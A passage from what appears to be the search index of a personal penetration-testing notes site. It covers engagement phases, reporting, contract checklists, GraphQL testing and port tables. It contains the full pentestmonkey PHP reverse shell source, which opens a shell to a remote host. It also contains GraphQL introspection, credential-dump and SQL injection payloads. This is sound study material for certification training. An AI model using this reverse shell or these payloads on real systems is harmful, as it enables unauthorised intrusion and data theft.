Hybrid evasive, and Non-evasive.</li> <li>Information Gathering. The information gathering stage starts all over again from the local perspective. We also enumerate the local network and local services such as printers, database servers, virtualization services, etc.</li> <li>Pillaging. Pillaging is the stage where we examine the role of the host in the corporate network. We analyze the network configurations, including but not limited to: Interfaces, Routing, DNS, ARP, Services, VPN, IP Subnets, Shares, Network Traffic.</li> <li>Vulnerability Assessment: it is essential to distinguish between exploits that can harm the system and attacks against the services that do not cause any disruption.</li> <li>Privilege Escalation </li> <li>Persistence </li> <li>Data Exfiltration: During the <code>Information Gathering</code> and <code>Pillaging</code> stage, we will often be able to find, among other things, considerable personal information and customer data. Some clients will want to check whether it is possible to exfiltrate these types of data. This means we try to transfer this information from the target system to our own.</li> </ul>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#lateral-movement","title":"Lateral movement","text":"<p>In this stage, we want to test how far we can move manually in the entire network and what vulnerabilities we can find from the internal perspective that might be exploited. In doing so, we will again run through several phases:</p> <ol> <li>Pivoting</li> <li>Evasive Testing: There are many ways to protect against lateral movement, including network (micro) <code>segmentation</code>, <code>threat monitoring</code>, <code>IPS</code>/<code>IDS</code>, <code>EDR</code>, etc. To bypass these efficiently, we need to understand how they work and what they respond to. Then we can adapt and apply methods and strategies that help avoid detection.</li> <li>Information Gathering</li> <li>Vulnerability Assessment</li> <li>(Privilege) Exploitation</li> <li>Post-Exploitation</li> </ol>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#proof-of-concept","title":"Proof-Of-Concept","text":"<p><code>Proof of Concept</code> (<code>PoC</code>) or <code>Proof of Principle</code> is a project management term. In project management, it serves as proof that a project is feasible in principle.</p> <p>A <code>PoC</code> can have many different representations. For example, <code>documentation</code> of the vulnerabilities found can also constitute a PoC. The more practical version of a PoC is a <code>script</code> or <code>code</code> that automatically exploits the vulnerabilities found. This demonstrates the flawless exploitation of the vulnerabilities. This variant is straightforward for an administrator or developer because they can see what steps our script takes to exploit the vulnerability.</p>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#post-engagement","title":"Post-Engagement","text":"","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#cleanup","title":"Cleanup","text":"<p>Cleanup: Once testing is complete, we should perform any necessary cleanup, such as deleting tools/scripts uploaded to target systems, reverting any (minor) configuration changes we may have made, etc. We should have detailed notes of all of our activities, making any cleanup activities easy and efficient. </p>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#reporting","title":"Reporting","text":"<p>Documentation and Reporting: Before completing the assessment and disconnecting from the client's internal network or sending \"stop\" notification emails to signal the end of testing, we must make sure to have adequate documentation for all findings that we plan to include in our report. This includes command output, screenshots, a listing of affected hosts, and anything else specific to the client environment or finding.</p> <p>Typical parts of a report:</p> <ul> <li>Executive Summary: The report typically begins with an executive summary, which is a high-level overview of the key findings and the overall security posture of the web application. It highlights the most critical vulnerabilities, potential risks, and the impact they may have on the business. This section is designed for management and non-technical stakeholders to provide a quick understanding of the test results.</li> <li>Scope and Methodology: This section provides a clear description of the scope of the penetration test, including the target application, its components, and the specific testing activities performed. It also outlines the methodologies and techniques used during the assessment to ensure transparency and understanding of the testing process.</li> <li>Findings and Vulnerabilities: The core of the penetration test report is the detailed findings section. Each identified vulnerability is listed, along with a comprehensive description of the issue, the steps to reproduce it, and its potential impact on the application and organization. The vulnerabilities are categorized based on their severity level (e.g., critical, high, medium, low) to prioritize remediation efforts. </li> <li>Proof of Concept (PoC): For each identified vulnerability, the penetration tester includes a proof of concept (PoC) to demonstrate its exploitability. The PoC provides concrete evidence to support the validity of the findings and helps developers understand the exact steps required to reproduce the vulnerability.</li> <li>Risk Rating and Recommendations: In this section, the vulnerabilities are further analyzed to determine their risk rating and potential impact on the organization. The risk rating takes into account factors such as likelihood of exploitation, ease of exploit, potential data exposure, and business impact. Additionally, specific recommendations and best practices are provided to address and mitigate each vulnerability. </li> <li>Remediation Plan: The report should include a detailed remediation plan outlining the steps and actions required to fix the identified vulnerabilities. This plan helps guide the development and IT teams in prioritizing and addressing the security issues in a systematic manner.</li> <li>Additional Recommendations: In some cases, the report may include broader recommendations for improving the overall security posture of the web application beyond the identified vulnerabilities. These may include implementing security best practices, enhancing security controls, and conducting regular security awareness training.</li> <li>Appendices and Technical Details: Supporting technical details, such as HTTP requests and responses, server configurations, and logs, may be included in appendices to  provide additional context and evidence for the identified vulnerabilities.</li> </ul> <p>Resources:</p> <ul> <li>https://pentestreports.com/</li> </ul>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#report-review-meeting","title":"Report Review Meeting","text":"<p>Report Review Meeting: Once the draft report is delivered, and the client has had a chance to distribute it internally and review it in-depth, it is customary to hold a report review meeting to walk through the assessment results.</p>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#deliverable-acceptance","title":"Deliverable Acceptance","text":"<p>Deliverable Acceptance: Once the client has submitted feedback (i.e., management responses, requests for clarification/changes, additional evidence, etc.) either by email or (ideally) during a report review meeting, we can issue them a new version of the report marked <code>FINAL</code></p> <p>Post-Remediation Testing: Most engagements include post-remediation testing as part of the project's total cost. In this phase, we will review any documentation provided by the client showing evidence of remediation or just a list of remediated findings.</p> <p>Since a penetration test is essentially an audit, we must remain impartial third parties and not perform remediation on our findings (such as fixing code, patching systems, or making configuration changes in Active Directory). After a penetration test concludes, we will have a considerable amount of client-specific data such as scan results, log output, credentials, screenshots, and more. We should retain evidence for some time after the penetration test in case questions arise about specific findings or to assist with retesting \"closed\" findings after the client has performed remediation activities. Any data retained after the assessment should be stored in a secure location owned and controlled by the firm and encrypted at rest.</p>","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#anex","title":"Anex","text":"","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#contractors-agreement","title":"Contractors Agreement","text":"<p>Checklist for Physical Assessments</p> Checkpoint Contents <code>\u2610 Introduction</code> Description of this document. <code>\u2610 Contractor</code> Company name, contractor full name, job title. <code>\u2610 Penetration Testers</code> Company name, pentesters full name. <code>\u2610 Contact Information</code> Mailing addresses, e-mail addresses, and phone numbers of all client parties and penetration testers. <code>\u2610 Purpose</code> Description of the purpose for the conducted penetration test. <code>\u2610 Goals</code> Description of the goals that should be achieved with the penetration test. <code>\u2610 Scope</code> All IPs, domain names, URLs, or CIDR ranges. <code>\u2610 Lines of Communication</code> Online conferences or phone calls or face-to-face meetings, or via e-mail. <code>\u2610 Time Estimation</code> Start and end dates. <code>\u2610 Time of the Day to Test</code> Times of the day to test. <code>\u2610 Penetration Testing Type</code> External/Internal Penetration Test/Vulnerability Assessments/Social Engineering. <code>\u2610 Penetration Testing Locations</code> Description of how the connection to the client network is established. <code>\u2610 Methodologies</code> OSSTMM, PTES, OWASP, and others. <code>\u2610 Objectives / Flags</code> Users, specific files, specific information, and others. <code>\u2610 Evidence Handling</code> Encryption, secure protocols <code>\u2610 System Backups</code> Configuration files, databases, and others. <code>\u2610 Information Handling</code> Strong data encryption <code>\u2610 Incident Handling and Reporting</code> Cases for contact, pentest interruptions, type of reports <code>\u2610 Status Meetings</code> Frequency of meetings, dates, times, included parties <code>\u2610 Reporting</code> Type, target readers, focus <code>\u2610 Retesting</code> Start and end dates <code>\u2610 Disclaimers and Limitation of Liability</code> System damage, data loss <code>\u2610 Permission to Test</code> Signed contract, contractors agreement","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#contract-checklist","title":"Contract Checklist","text":"Checkpoint Description <code>\u2610 NDA</code> Non-Disclosure Agreement (NDA) refers to a secrecy contract between the client and the contractor regarding all written or verbal information concerning an order/project. The contractor agrees to treat all confidential information brought to its attention as strictly confidential, even after the order/project is completed. Furthermore, any exceptions to confidentiality, the transferability of rights and obligations, and contractual penalties shall be stipulated in the agreement. The NDA should be signed before the kick-off meeting or at the latest during the meeting before any information is discussed in detail. <code>\u2610 Goals</code> Goals are milestones that must be achieved during the order/project. In this process, goal setting is started with the significant goals and continued with fine-grained and small ones. <code>\u2610 Scope</code> The individual components to be tested are discussed and defined. These may include domains, IP ranges, individual hosts, specific accounts, security systems, etc. Our customers may expect us to find out one or the other point by ourselves. However, the legal basis for testing the individual components has the highest priority here. <code>\u2610 Penetration Testing Type</code> When choosing the type of penetration test, we present the individual options and explain the advantages and disadvantages. Since we already know the goals and scope of our customers, we can and should also make a recommendation on what we advise and justify our recommendation accordingly. Which type is used in the end is the client's decision. <code>\u2610 Methodologies</code> Examples: OSSTMM, OWASP, automated and manual unauthenticated analysis of the internal and external network components, vulnerability assessments of network components and web applications, vulnerability threat vectorization, verification and exploitation, and exploit development to facilitate evasion techniques. <code>\u2610 Penetration Testing Locations</code> External: Remote (via secure VPN) and/or Internal: Internal or Remote (via secure VPN) <code>\u2610 Time Estimation</code> For the time estimation, we need the start and the end date for the penetration test. This gives us a precise time window to perform the test and helps us plan our procedure. It is also vital to explicitly ask how time windows the individual attacks (Exploitation / Post-Exploitation / Lateral Movement) are to be carried out. These can be carried out during or outside regular working hours. When testing outside regular working hours, the focus is more on the security solutions and systems that should withstand our attacks. <code>\u2610 Third Parties</code> For the third parties, it must be determined via which third-party providers our customer obtains services. These can be cloud providers, ISPs, and other hosting providers. Our client must obtain written consent from these providers describing that they agree and are aware that certain parts of their service will be subject to a simulated hacking attack. It is also highly advisable to require the contractor to forward the third-party permission sent to us so that we have actual confirmation that this permission has indeed been obtained. <code>\u2610 Evasive Testing</code> Evasive testing is the test of evading and passing security traffic and security systems in the customer's infrastructure. We look for techniques that allow us to find out information about the internal components and attack them. It depends on whether our contractor wants us to use such techniques or not. <code>\u2610 Risks</code> We must also inform our client about the risks involved in the tests and the possible consequences. Based on the risks and their potential severity, we can then set the limitations together and take certain precautions. <code>\u2610 Scope Limitations &amp; Restrictions</code> It is also essential to determine which servers, workstations, or other network components are essential for the client's proper functioning and its customers. We will have to avoid these and must not influence them any further, as this could lead to critical technical errors that could also affect our client's customers in production. <code>\u2610 Information Handling</code> HIPAA, PCI, HITRUST, FISMA/NIST, etc. <code>\u2610 Contact Information</code> For the contact information, we need to create a list of each person's name, title, job title, e-mail address, phone number, office phone number, and an escalation priority order. <code>\u2610 Lines of Communication</code> It should also be documented which communication channels are used to exchange information between the customer and us. This may involve e-mail correspondence, telephone calls, or personal meetings. <code>\u2610 Reporting</code> Apart from the report's structure, any customer-specific requirements the report should contain are also discussed. In addition, we clarify how the reporting is to take place and whether a presentation of the results is desired. <code>\u2610 Payment Terms</code> Finally, prices and the terms of payment are explained.","tags":["pentesting","CPTS","eWPT"]},{"location":"penetration-testing-process/#rules-of-engagement","title":"Rules of Engagement","text":"<p>Checklist</p> Checkpoint Contents <code>\u2610 Introduction</code> Description of this document. <code>\u2610 Contractor</code> Company name, contractor full name, job title. <code>\u2610 Penetration Testers</code> Company name, pentesters full name. <code>\u2610 Contact Information</code> Mailing addresses, e-mail addresses, and phone numbers of all client parties and penetration testers. <code>\u2610 Purpose</code> Description of the purpose for the conducted penetration test. <code>\u2610 Goals</code> Description of the goals that should be achieved with the penetration test. <code>\u2610 Scope</code> All IPs, domain names, URLs, or CIDR ranges. <code>\u2610 Lines of Communication</code> Online conferences or phone calls or face-to-face meetings, or via e-mail. <code>\u2610 Time Estimation</code> Start and end dates. <code>\u2610 Time of the Day to Test</code> Times of the day to test. <code>\u2610 Penetration Testing Type</code> External/Internal Penetration Test/Vulnerability Assessments/Social Engineering. <code>\u2610 Penetration Testing Locations</code> Description of how the connection to the client network is established. <code>\u2610 Methodologies</code> OSSTMM, PTES, OWASP, and others. <code>\u2610 Objectives / Flags</code> Users, specific files, specific information, and others. <code>\u2610 Evidence Handling</code> Encryption, secure protocols <code>\u2610 System Backups</code> Configuration files, databases, and others. <code>\u2610 Information Handling</code> Strong data encryption <code>\u2610 Incident Handling and Reporting</code> Cases for contact, pentest interruptions, type of reports <code>\u2610 Status Meetings</code> Frequency of meetings, dates, times, included parties <code>\u2610 Reporting</code> Type, target readers, focus <code>\u2610 Retesting</code> Start and end dates <code>\u2610 Disclaimers and Limitation of Liability</code> System damage, data loss <code>\u2610 Permission to Test</code> Signed contract, contractors agreement","tags":["pentesting","CPTS","eWPT"]},{"location":"pentesmonkey/","title":"Pentesmonkey php reverse shell","text":"Resources to generate reverse shells <ul> <li>https://www.revshells.com/</li> <li>Netcat for windows 32/64 bit </li> <li>Pentesmonkey</li> <li>PayloadsAllTheThings </li> </ul> <p>Additionally, have a look at \"notes on reverse shells\"</p> <p>Download Pentesmonkey from github: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php.</p> <pre><code>&lt;?php\n// php-reverse-shell - A Reverse Shell implementation in PHP\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  The author accepts no liability\n// for damage caused by this tool.  If these terms are not acceptable to you, then\n// do not use this tool.\n//\n// In all other respects the GPL version 2 applies:\n//\n// This program is free software; you can redistribute it and/or modify\n// it under the terms of the GNU General Public License version 2 as\n// published by the Free Software Foundation.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License along\n// with this program; if not, write to the Free Software Foundation, Inc.,\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n//\n// This tool may be used for legal purposes only.  Users take full responsibility\n// for any actions performed using this tool.  If these terms are not acceptable to\n// you, then do not use this tool.\n//\n// You are encouraged to send comments, improvements or suggestions to\n// me at pentestmonkey@pentestmonkey.net\n//\n// Description\n// -----------\n// This script will make an outbound TCP connection to a hardcoded IP and port.\n// The recipient will be given a shell running as the current user (apache normally).\n//\n// Limitations\n// -----------\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n//\n// Usage\n// -----\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '127.0.0.1';  // CHANGE THIS\n$port = 1234;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n\n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n\n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\n// Change to a safe directory\nchdir(\"/\");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 =&gt; array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 =&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 =&gt; array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process's STDIN\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process's STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n\n    // If we can read from the process's STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we've daemonised ourself\n// (I can't figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n}\n\n?&gt; \n</code></pre>","tags":["reverse shell","php"]},{"location":"pentesting-ci-cd/","title":"Pentesting ci cd","text":""},{"location":"pentesting-ci-cd/#installation","title":"Installation","text":"<p>Repo: https://github.com/cider-security-research/cicd-goat</p> <p>Installation:</p> <pre><code>curl -o cicd-goat/docker-compose.yaml --create-dirs https://raw.githubusercontent.com/cider-security-research/cicd-goat/main/docker-compose.yaml\n</code></pre> <pre><code>cd cicd-goat &amp;&amp; docker compose up -d\n</code></pre>"},{"location":"pentesting-graphql/","title":"Pentesting GraphQL","text":"","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#common-directories","title":"Common Directories","text":"<pre><code>/graphql\n/graphiql\n/graphql.php\n/graphql/console\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#basic-operations-queries","title":"Basic Operations - Queries","text":"<p>We can fetch field information by sending queries.</p> <pre><code>query {\n    __typename\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#fields","title":"Fields","text":"<p>To fetch a field object, send a query like the following.</p> <pre><code>query {\n    user {\n        name\n        friends {\n            name\n        }\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#arguments","title":"Arguments","text":"<p>We can get the specific information by padding arguments (e.g.\u00a0<code>id</code>) to fields.</p> <pre><code>query {\n    user (id: \"1\") {\n        name\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#aliases","title":"Aliases","text":"<p>We can set aliases each field to get multiple results in one request.</p> <pre><code>query {\n    John: user (id: \"1\") {\n        name\n        age\n    }\n    Emma: user (id: \"2\") {\n        name\n        age\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#fragments","title":"Fragments","text":"<p>We can define arbitrary fragment that is be reusable when fetching each field.</p> <pre><code>query {\n    firstUser: user (id: \"1\") {\n        ...userFields\n    }\n    secondUser: user (id: \"2\") {\n        ...userFields\n    }\n\n    fragment userFields on User {\n        name\n        age\n        friends {\n            name\n        }\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#operation-names","title":"Operation Names","text":"<p>We can define an operation name to make an operation less ambiguous. By setting a name, it makes it easier to understand at a glance what kind of operation.</p> <pre><code>query UserNameAndFriends {\n    user {\n        name\n        friends {\n            name\n        }\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#variables","title":"Variables","text":"<pre><code>query UsrNameAndFriends($userId: ID) {\n    user (id: $userId) {\n        name\n        friends {\n            name\n        }\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#directives","title":"Directives","text":"<p>We can filter by passing a directive in fields.</p> <ul> <li>include</li> </ul> <p>Only include this field if the argument is\u00a0<code>true</code>.</p> <pre><code>query UserNameAndFriends($userId: ID, $withFriends: Boolean!) {\n    user(id: $userId) {\n        name\n        friends @include(if: $withFriends) {\n            name\n        }\n    }\n}\n</code></pre> <ul> <li>skip</li> </ul> <p>Skip this field if the argument is\u00a0<code>true</code>.</p> <pre><code>query UserNameAndFriends($userId: ID, $withFriends: Boolean!) {\n    user(id: $userId) {\n        name\n        friends @skip(if: $withFriends) {\n            name\n        }\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#basic-operations-mutations","title":"Basic Operations - Mutations","text":"<p>We can modify fields with the\u00a0<code>mutation</code>\u00a0field.</p> <pre><code>mutation {\n    __typename\n}\n</code></pre> <p>To modify a field, execute like the following.</p> <pre><code>mutation CreateCommentForPost($postId: ID!, $comment: Comment!) {\n    createComment(id: $postId, comment: $comment) {\n        comment\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#enumeration","title":"Enumeration","text":"<pre><code># List fields\nquery { __schema { types { name } } }\nquery { __schema { types { fields { name } } } }\nquery { __schema { types { fields { name description } } } }\nquery { __schema { types { name fields { name } } } }\nquery { __schema { types { name fields { name args { name description type { name kind ofType { name kind } } } } } } }\n\n# Dump database schema\nfragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }  possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }} query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } }\n\n# Dump specific field\nquery { getUsers { username, password } }\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#sql-injection","title":"SQL Injection","text":"<p>We might be able to inject SQL somewhere e.g. arguments. Please refer to\u00a0SQL Injection Cheat Sheet\u00a0for more payloads.</p> <pre><code>{\n    user (id: \"1' UNION SELECT null,null-- -\") {\n        name\n        password\n    }\n}\n</code></pre>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#nosql-injection","title":"NoSQL Injection","text":"<p>We might be able to inject NoSQL somewhere e.g. arguments. Please refer to\u00a0NoSQL Injection\u00a0for more payloads.</p>","tags":["pentesting","api","graphql"]},{"location":"pentesting-graphql/#references","title":"References","text":"<ul> <li>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection</li> <li>https://graphql.org/learn/queries/</li> <li>https://escape.tech/blog/pentest101/</li> </ul>","tags":["pentesting","api","graphql"]},{"location":"pentesting-network-services/","title":"Pentesting network services","text":"<p>Port numbers range from 1 to 65,535, with the range of well-known ports 1 to 1,023 being reserved for privileged services. Port 0 is a reserved port in TCP/IP networking and is not used in TCP or UDP messages. If anything attempts to bind to port 0 (such as a service), it will bind to the next available port above port 1,024 because port 0 is treated as a \"wild card\" port.</p> <p>See Pentesting network services. </p> <p>To locate easily one: https://www.cheatsheet.wtf/PortNumbers/</p> <p>All ports in raw: https://raw.githubusercontent.com/maraisr/ports-list/master/all.csv.</p>","tags":["ports","services","network services"]},{"location":"pentesting-network-services/#tcp","title":"TCP","text":"Protocol Acronym Port Description Tools File Transfer Protocol <code>FTP</code> <code>20-21</code> Used to transfer files ftp, lftp , ncftp, filezilla, crossftp Secure Shell <code>SSH</code> <code>22</code> Secure remote login service Telnet <code>Telnet</code> <code>23</code> Remote login service Simple Network Management Protocol <code>SNMP</code> <code>161-162</code> Manage network devices Hyper Text Transfer Protocol <code>HTTP</code> <code>80</code> Used to transfer webpages Hyper Text Transfer Protocol Secure <code>HTTPS</code> <code>443</code> Used to transfer secure webpages Domain Name System <code>DNS</code> <code>53</code> Lookup domain names Trivial File Transfer Protocol <code>TFTP</code> <code>69</code> Used to transfer files Network Time Protocol <code>NTP</code> <code>123</code> Synchronize computer clocks Simple Mail Transfer Protocol <code>SMTP</code> <code>25</code> Used for email transfer Thunderbird, Claws, Geary, MailSpring, mutt, mailutils, sendEmail, swaks, sendmail. Post Office Protocol <code>POP3</code> <code>110</code> Used to retrieve emails Internet Message Access Protocol <code>IMAP</code> <code>143</code> Used to access emails Server Message Block <code>SMB</code> <code>445</code> Used to transfer files Samba Suite, smbclient, crackmapexec, SMBMap, smbexec.py, psexec.py, Impacket Network File System <code>NFS</code> <code>111</code>, <code>2049</code> Used to mount remote systems Bootstrap Protocol <code>BOOTP</code> <code>67</code>, <code>68</code> Used to bootstrap computers Kerberos <code>Kerberos</code> <code>88</code> Used for authentication and authorization Lightweight Directory Access Protocol <code>LDAP</code> <code>389</code> Used for directory services Remote Authentication Dial-In User Service <code>RADIUS</code> <code>1812</code>, <code>1813</code> Used for authentication and authorization Dynamic Host Configuration Protocol <code>DHCP</code> <code>67</code>, <code>68</code> Used to configure IP addresses Remote Desktop Protocol <code>RDP</code> <code>3389</code> Used for remote desktop access Network News Transfer Protocol <code>NNTP</code> <code>119</code> Used to access newsgroups Remote Procedure Call <code>RPC</code> <code>135</code>, <code>137-139</code> Used to call remote procedures Identification Protocol <code>Ident</code> <code>113</code> Used to identify user processes Internet Control Message Protocol <code>ICMP</code> <code>0-255</code> Used to troubleshoot network issues Internet Group Management Protocol <code>IGMP</code> <code>0-255</code> Used for multicasting Oracle DB (Default/Alternative) Listener <code>oracle-tns</code> <code>1521</code>/<code>1526</code> The Oracle database default/alternative listener is a service that runs on the database host and receives requests from Oracle clients. Ingres Lock <code>ingreslock</code> <code>1524</code> Ingres database is commonly used for large commercial applications and as a backdoor that can execute commands remotely via RPC. Squid Web Proxy <code>http-proxy</code> <code>3128</code> Squid web proxy is a caching and forwarding HTTP web proxy used to speed up a web server by caching repeated requests. Secure Copy Protocol <code>SCP</code> <code>22</code> Securely copy files between systems Session Initiation Protocol <code>SIP</code> <code>5060</code> Used for VoIP sessions Simple Object Access Protocol <code>SOAP</code> <code>80</code>, <code>443</code> Used for web services Secure Socket Layer <code>SSL</code> <code>443</code> Securely transfer files TCP Wrappers <code>TCPW</code> <code>113</code> Used for access control Network Time Protocol <code>NTP</code> <code>123</code> Synchronize computer clocks Internet Security Association and Key Management Protocol <code>ISAKMP</code> <code>500</code> Used for VPN connections Microsoft SQL Server <code>ms-sql-s</code> <code>1433</code> Used for client connections to the Microsoft SQL Server. mssql-cli, mssqlclient.py, dbeaver Kerberized Internet Negotiation of Keys <code>KINK</code> <code>892</code> Used for authentication and authorization Open Shortest Path First <code>OSPF</code> <code>520</code> Used for routing Point-to-Point Tunneling Protocol <code>PPTP</code> <code>1723</code> Is used to create VPNs Remote Execution <code>REXEC</code> <code>512</code> This protocol is used to execute commands on remote computers and send the output of commands back to the local computer. Remote Login <code>RLOGIN</code> <code>513</code> This protocol starts an interactive shell session on a remote computer. Remote Copy and Remote Shell <code>RCP</code>and <code>RSH</code> 514 Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the <code>cp</code> command on Linux but provides <code>no warning to the user for overwriting existing files on a system</code>.Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files for validation. X Window System <code>X11</code> <code>6000</code> It is a computer software system and network protocol that provides a graphical user interface (GUI) for networked computers. Relational Database Management System <code>DB2</code> <code>50000</code> RDBMS is designed to store, retrieve and manage data in a structured format for enterprise applications such as financial systems, customer relationship management (CRM) systems.","tags":["ports","services","network services"]},{"location":"pentesting-network-services/#udp","title":"UDP","text":"Protocol Acronym Port Description Domain Name System <code>DNS</code> <code>53</code> It is a protocol to resolve domain names to IP addresses. Trivial File Transfer Protocol <code>TFTP</code> <code>69</code> It is used to transfer files between systems. Network Time Protocol <code>NTP</code> <code>123</code> It synchronizes computer clocks in a network. Simple Network Management Protocol <code>SNMP</code> <code>161</code> It monitors and manages network devices remotely. Routing Information Protocol <code>RIP</code> <code>520</code> It is used to exchange routing information between routers. Internet Key Exchange <code>IKE</code> <code>500</code> Internet Key Exchange Intelligent Platform Management Interface (IPMI) <code>IPMI</code> <code>623</code>, <code>1900</code> System management tool that provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. Bootstrap Protocol <code>BOOTP</code> <code>68</code> It is used to bootstrap hosts in a network. Dynamic Host Configuration Protocol <code>DHCP</code> <code>67</code> It is used to assign IP addresses to devices in a network dynamically. Telnet <code>TELNET</code> <code>23</code> It is a text-based remote access communication protocol. MySQL <code>MySQL</code> <code>3306</code> It is an open-source database management system. Terminal Server <code>TS</code> <code>3389</code> It is a remote access protocol used for Microsoft Windows Terminal Services by default. NetBIOS Name <code>netbios-ns</code> <code>137</code> It is used in Windows operating systems to resolve NetBIOS names to IP addresses on a LAN. Microsoft SQL Server <code>ms-sql-m</code> <code>1434</code> Used for the Microsoft SQL Server Browser service. Universal Plug and Play <code>UPnP</code> <code>1900</code> It is 